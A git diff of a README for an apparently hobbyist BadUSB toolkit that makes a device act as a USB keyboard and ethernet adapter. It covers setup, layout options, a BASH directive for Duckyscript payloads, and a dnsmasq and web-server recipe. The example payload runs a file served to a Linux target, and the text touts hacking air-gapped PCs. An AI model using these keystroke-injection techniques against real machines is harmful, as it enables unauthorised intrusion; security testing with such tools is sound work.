@@ -17,19 +17,44 @@ Do `gunzip -c /proc/config.gz | grep CONFIG_USB_GADGET=` and check if it ends in
 To install the scripts clone the repository first and cd into it, and then simply compile usleep and hid-gadget-test:
 `gcc -o hid-gadget-test.c hid-gadget-test`
 `gcc -o usleep.c usleep`
-Then, you can simply remove the .c files and copy the binaries to /usr/bin.
-Keep in mind you'll need a different 'badusb' binary for each keyboard layout, so copy the one for your keyboard like so:
-`sudo cp badusb-[YOUR_LAYOUT] /usr/bin/badusb`
+Then, you can simply remove the .c files and copy those along with the pinebunny and usbarsenal binaries to /usr/local/bin.
+Everytime you run the 'pinebunny' script you'll have to choose the layout you want to use. BUT, if you only need to use one of them and don't want to be entering everytime you use the tool, you can hardcode it in and it won't ask you again unless you change it back. Just simply edit pinebunny at the beginning of the file from something like this:
 
-Only en_US and es_ES are supported right now, I'll work on more layouts when I get the time.
+`#!/bin/bash
+
+defdelay=0
+kb="/dev/hidg0 keyboard"
+
+last_cmd=""
+last_string=""
+line_num=0
+layout=""	#Enter the name of the layout here [us, es, it]
+choose=true	#Change this to false and hardcode a layout before if you only plan on using 1 keyboard distribution
+`
+To something like this:
+
+`
+layout="us"	#Enter the name of the layout here [us, es, it]
+choose=false	#Change this to false and hardcode a layout before if you only plan on using 1 keyboard distribution
+`
+
+Only us ,es and it layouts are supported right now, I'll work on more layouts when I get the time.
 
 
 # Usage
 
 The badusb script uses conventional Duckyscript, and its usage is:
 
-`sudo usbarsenal` (you need to enable /dev/hidg0 first, tho usbarsenal also has options for enabling the ecm module of USB Gadget and Mass Storage, so you'll have ethernet over USB, too. Just keep in mind that your target won't get an IP address automatically assigned without a proper dhcp server running. I personally like to use dnsmasq)
-`sudo badusb duckypayload.txt`
+`sudo usbarsenal` You need to enable /dev/hidg0 first, tho usbarsenal also has options for enabling ECM or RNDIS tethering and Mass Storage (you need to specify the loop device to use), so you'll have ethernet over USB, too. Just keep in mind that your target won't get an IP address automatically assigned without a proper dhcp server running. I personally like to use dnsmasq)
+`sudo pinebunny duckypayload.txt`
+
+# UPDATE
+
+Now you can execute bash commands in any part of the duckyscript payload just as you would do so on a Bash Bunny! The difference being that the Bash Bunny payloads run bash commands like normal and it uses `Q STRING somethinghere` to specify the next thing is just duckyscript, and here it's backwards. By default everything is duckyscript and you specify a bash command like this: `BASH somecommandhere`.
+
+Only limitation of running bash commands like this is that it will wait until that command finishes (with or without errors) before executing the next intruction of the payload, so some commands that execute forever until you stop them will freeze the rest of the payload from executing. There's an easy fix for that though, and that's to run that command as a background process like: `BASH someinfinitecommandhere &`, and then just disowning the process and moving on with life: `BASH disown %`. After that the process will run in the background and the rest of the payload will continue.
+
+Enjoy using bash commands to do crazy stuff to your heart's content ^_^
 
 
 # Example payload using HID + Ethernet
@@ -49,7 +74,13 @@ log-queries
 log-dhcp 
 listen-address=127.0.0.1
 ```
-`sudo dnsmasq -C dnsmasq.conf -d` We leave that running and we also leave the web server running: `python -m http.server`. Now it should work. Our example payload file looks like this, and it is aimed at a regular linux desktop:
+`sudo dnsmasq -C dnsmasq.conf -d` We leave that running or we add it to the payload itself 
+
+`
+BASH dnsmasq -C dnsmasq.conf -d
+BASH disown %
+``` 
+and we also leave the web server running: `python -m http.server` (or add it to the payload as well as above). Now it should work. Our example payload file looks like this, and it is aimed at a regular linux desktop:
 
 ```
 DELAY 2000
@@ -67,7 +98,7 @@ DELAY 100
 STRING ./hello
 ENTER
 ```
-`sudo badusb payload.txt`
+`sudo pinebunny payload.txt`
 
 Remember, ethernet over USB can give you physical network access to a computer, which means you could hack an airgapped PC too!
 Moreover, you are not forced to use a Duckyscript payload, you could just ignore that and launch a nmap scan physically connected over USB!
